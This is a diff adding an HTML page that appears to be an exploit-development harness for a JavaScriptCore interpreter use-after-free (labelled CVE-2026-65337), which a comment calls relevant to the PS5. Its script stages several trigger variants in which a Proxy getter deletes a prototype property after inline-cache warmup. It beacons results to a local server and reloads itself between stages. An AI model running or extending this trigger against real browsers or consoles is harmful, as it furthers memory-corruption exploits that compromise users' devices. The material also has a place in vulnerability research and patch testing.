@@ -1,0 +1,180 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1175 LLInt Polymorphic-Call IC UAF (CVE-2026-65337)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1175 — LLInt POLYMORPHIC-CALL IC UAF (CVE-2026-65337)</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1175-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1175: CVE-2026-65337 (bug 317142, fixed 2026-08-25).
+   Bug: handleHostCall (a Proxy apply trap etc.) runs JS that fires a
+   watchpoint invalidating the polymorphic call IC; afterwards the LLInt
+   path (llint_polymorphic_call) links the stale CallLinkInfo -> engine
+   crash (fix: skip linkPolymorphicCall after host calls).
+   PS5-relevant: the fix touches LLIntSlowPaths.cpp — interpreter path.
+   Trigger (upstream stress test, browser-adapted — noInline dropped):
+     warm a polymorphic GETTER-call IC on o.p, then make the getter a
+     Proxy whose apply trap deletes proto.p (watchpoint fire), then call
+     getP(o) once more.
+   Stages: detect / single / 100x / defineProperty variant / 2-object /
+   baseline-vs-64bit IC loop.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['detect','single','loop100','defprop','twoobj','warm1024'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1175_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1175_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/5 — '+STAGES[stage]);
+setCounters('prev: '+JSON.stringify(results).slice(0,400));
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1175_stage');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1175_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function runTrigger(warmup){
+  var proto={};
+  function g1(){return 1;}function g2(){return 2;}function g3(){return 3;}
+  proto.__defineGetter__('p',g1);
+  var o=Object.create(proto);
+  function getP(obj){return obj.p;}
+  var n=warmup||80;
+  for(var i=0;i<n;i++)getP(o);
+  proto.__defineGetter__('p',g2);getP(o);
+  proto.__defineGetter__('p',g3);getP(o);
+  var evil=new Proxy(function(){},{apply:function(target,thisArg,args){
+    delete proto.p;
+    return 0x42;
+  }});
+  proto.__defineGetter__('p',evil);
+  var last;
+  try{last=getP(o);}catch(e){last='THROW:'+e.message.slice(0,30);}
+  return last;
+}
+
+function done(rep){
+  results.push({stage:stage,name:cur,result:rep});
+  try{localStorage.setItem('p1175_res',JSON.stringify(results));}catch(e){}
+  B('RESULT',rep.slice(0,700));
+  addFind(cur+': '+rep);
+  setStatus(rep);
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT');
+  setTimeout(function(){location.reload(true);},700);
+}
+
+if(cur==='detect'){
+  var hasProxy=(typeof Proxy==='function');
+  var hasDefG=(typeof Object.prototype.__defineGetter__==='function');
+  var hasNoInline=(typeof noInline==='function');
+  done('proxy='+hasProxy+'|defGetter='+hasDefG+'|noInline='+hasNoInline);
+}else if(cur==='single'){
+  setPhase('single trigger');
+  B('RUN','single');
+  var v=runTrigger(80);
+  done('SURVIVED|last='+v);
+}else if(cur==='loop100'){
+  setPhase('100x loop');
+  B('RUN','loop100');
+  var last='';
+  for(var k=0;k<100;k++){last=runTrigger(80);}
+  done('SURVIVED-100x|last='+last);
+}else if(cur==='defprop'){
+  setPhase('defineProperty variant');
+  var proto={};
+  function g1(){return 1;}function g2(){return 2;}function g3(){return 3;}
+  Object.defineProperty(proto,'p',{get:g1,configurable:true});
+  var o=Object.create(proto);
+  function getP(obj){return obj.p;}
+  for(var i=0;i<80;i++)getP(o);
+  Object.defineProperty(proto,'p',{get:g2,configurable:true});getP(o);
+  Object.defineProperty(proto,'p',{get:g3,configurable:true});getP(o);
+  var evil=new Proxy(function(){},{apply:function(t,ta,args){
+    delete proto.p;return 0x42;}});
+  Object.defineProperty(proto,'p',{get:evil,configurable:true});
+  var v2;try{v2=getP(o);}catch(e){v2='THROW:'+e.message.slice(0,30);}
+  done('SURVIVED|last='+v2);
+}else if(cur==='twoobj'){
+  setPhase('two objects variant');
+  var proto={};
+  function g1(){return 1;}function g2(){return 2;}function g3(){return 3;}
+  proto.__defineGetter__('p',g1);
+  var o1=Object.create(proto),o2=Object.create(proto);
+  function getP(obj){return obj.p;}
+  for(var i=0;i<80;i++){getP(o1);getP(o2);}
+  proto.__defineGetter__('p',g2);getP(o1);
+  proto.__defineGetter__('p',g3);getP(o2);
+  var evil=new Proxy(function(){},{apply:function(t,ta,args){
+    delete proto.p;return 0x42;}});
+  proto.__defineGetter__('p',evil);
+  var v3;try{v3=getP(o1)+','+getP(o2);}catch(e){v3='THROW:'+e.message.slice(0,30);}
+  done('SURVIVED|last='+v3);
+}else if(cur==='warm1024'){
+  setPhase('1024 warmup variant');
+  B('RUN','warm1024');
+  var v4=runTrigger(1024);
+  done('SURVIVED|last='+v4);
+}
+
+} /* stage machine */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1175-llint-ic-uaf';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
